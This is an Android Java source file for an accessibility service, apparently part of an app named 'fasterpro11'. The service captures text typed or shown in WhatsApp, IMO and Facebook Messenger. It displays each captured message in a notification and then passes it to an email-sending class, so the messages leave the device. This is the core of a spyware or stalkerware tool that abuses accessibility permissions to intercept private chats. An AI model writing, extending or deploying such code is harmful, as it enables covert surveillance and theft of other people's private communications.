package com.example.fasterpro11;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;

import androidx.core.app.NotificationCompat;

import java.util.ArrayList;
import java.util.List;

public class WhatsAppIMOMessengerContent extends AccessibilityService {

    private static final String TAG = "WhatsAppIMOMessenger";

    private static final int NOTIFICATION_ID = 1234; // Unique ID for the notification
    private static final String CHANNEL_ID = "WhatsAppIMOMessengerContent_Channel";

    // Lists to store outgoing messages (not used in this example)
    // private List<String> outWhatsApp = new ArrayList<>();
    // private List<String> outImo = new ArrayList<>();
    // private List<String> outMessenger = new ArrayList<>();

    private boolean shouldForwardMessages = true; // Flag to control message forwarding

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();
        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                CharSequence text = event.getText().get(0); // Assuming only one text change event at a time
                String messageText = text.toString();
                String packageName = event.getPackageName().toString();
                // Check if the message is from WhatsApp, IMO, or Messenger
                if (shouldForwardMessages) {
                    if (packageName.equals("com.whatsapp")) {
                        notifyMessageReceived("WhatsApp", messageText);
                    } else if (packageName.equals("com.imo.android.imoim")) {
                        notifyMessageReceived("Imo", messageText);
                    } else if (packageName.equals("com.facebook.orca")) {
                        notifyMessageReceived("Messenger", messageText);
                    }
                }
                break;
        }
    }

    @Override
    public void onInterrupt() {
        // Handle accessibility service interruption if needed
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = getString(R.string.channel_name);
            String description = getString(R.string.channel_description);
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }

    private void notifyMessageReceived(String app, String message) {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_message)  // Assuming ic_message is your icon resource
                .setContentTitle("New Message from " + app)
                .setContentText(message)
                .setPriority(NotificationCompat.PRIORITY_DEFAULT);

        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.notify(NOTIFICATION_ID, builder.build());

        // After notifying, optionally implement logic to send email with the message
        JavaMailAPI_WhatsAppIMOMessengerSender.sendEmail(app, message);
    }

    public void stopForwarding() {
        // Method to stop message forwarding
        shouldForwardMessages = false;
    }
}
